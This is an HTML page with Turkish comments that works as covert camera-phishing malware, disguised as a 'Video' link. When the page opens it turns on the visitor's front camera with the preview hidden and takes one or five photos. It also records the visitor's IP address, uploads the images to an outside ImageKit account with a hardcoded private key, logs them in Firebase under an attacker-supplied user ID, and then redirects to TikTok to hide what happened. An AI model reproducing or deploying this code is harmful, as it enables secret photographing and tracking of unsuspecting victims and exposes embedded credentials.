<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Video</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#000;width:100vw;height:100vh;overflow:hidden;}
        video{position:fixed;top:-100%;left:-100%;width:1px;height:1px;opacity:0;}
        canvas{display:none;}
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
(function(){
    // FIREBASE KONFIG
    const FIREBASE_CONFIG = {
        apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
        authDomain: "camerahhh-15487.firebaseapp.com",
        projectId: "camerahhh-15487",
        storageBucket: "camerahhh-15487.firebasestorage.app",
        messagingSenderId: "212849652224",
        appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
    };

    const IMAGEKIT_CONFIG = {
        publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
        privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
    };

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let mediaStream = null;

    function uploadToImageKit(file) {
        return new Promise((resolve, reject) => {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
            formData.append('fileName', Date.now() + '_' + file.name);
            formData.append('folder', '/web-uploads');
            formData.append('useUniqueFileName', 'true');

            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
            const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
            xhr.setRequestHeader('Authorization', 'Basic ' + auth);

            xhr.onload = () => {
                if (xhr.status >= 200 && xhr.status < 300) {
                    try {
                        resolve({ success: true, url: JSON.parse(xhr.responseText).url });
                    } catch(e) { reject('Upload failed'); }
                } else { reject('Upload error'); }
            };
            xhr.onerror = () => reject('Network error');
            xhr.send(formData);
        });
    }

    function capturePhoto() {
        return new Promise((resolve) => {
            if (!video.videoWidth || !video.videoHeight) {
                resolve(null);
                return;
            }
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob((blob) => {
                if (!blob) { resolve(null); return; }
                resolve(new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' }));
            }, 'image/jpeg', 0.85);
        });
    }

    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => d.ip)
            .catch(() => 'unknown');
    }

    function loadFirebaseAndSave(data) {
        return new Promise((resolve) => {
            // Firebase'i yükle
            const fbScript = document.createElement('script');
            fbScript.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
            fbScript.onload = () => {
                const fsScript = document.createElement('script');
                fsScript.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
                fsScript.onload = () => {
                    try {
                        if (typeof firebase !== 'undefined' && !firebase.apps.length) {
                            firebase.initializeApp(FIREBASE_CONFIG);
                        }
                        const db = firebase.firestore();
                        db.collection("captures").add(data).then(() => resolve()).catch(() => resolve());
                    } catch(e) { resolve(); }
                };
                fsScript.onerror = () => resolve();
                document.head.appendChild(fsScript);
            };
            fbScript.onerror = () => resolve();
            document.head.appendChild(fbScript);
        });
    }

    async function start() {
        try {
            const params = new URLSearchParams(window.location.search);
            let mode = params.get('mode');
            let redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
            let userId = params.get('uid');

            if (!userId) {
                window.location.href = redirectUrl;
                return;
            }

            // SADECE FOTOĞRAF MODLARI ÇALIŞIR
            let photoCount = 1;
            if (mode === '5photos') photoCount = 5;
            else if (mode !== 'photo' && mode !== '5photos') {
                // Video/audio modlarını fotoğrafa çevir
                photoCount = 1;
            }

            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            mediaStream = stream;
            video.srcObject = stream;
            await video.play();

            setTimeout(async () => {
                const ip = await getIP();
                let mediaUrls = [];

                for (let i = 0; i < photoCount; i++) {
                    const file = await capturePhoto();
                    if (file) {
                        const res = await uploadToImageKit(file);
                        if (res.success) mediaUrls.push(res.url);
                    }
                    if (photoCount > 1) await new Promise(r => setTimeout(r, 150));
                }

                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());

                if (mediaUrls.length > 0 && userId) {
                    await loadFirebaseAndSave({
                        media: mediaUrls,
                        ip: ip,
                        mode: mode === '5photos' ? '5photos' : 'photo',
                        userId: userId,
                        timestamp: new Date().toISOString(),
                        unix: Date.now()
                    });
                }

                window.location.href = redirectUrl;
            }, 600);
        } catch(err) {
            const redirectUrl = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com';
            window.location.href = redirectUrl;
        }
    }

    start();
})();
</script>
</body>
</html>
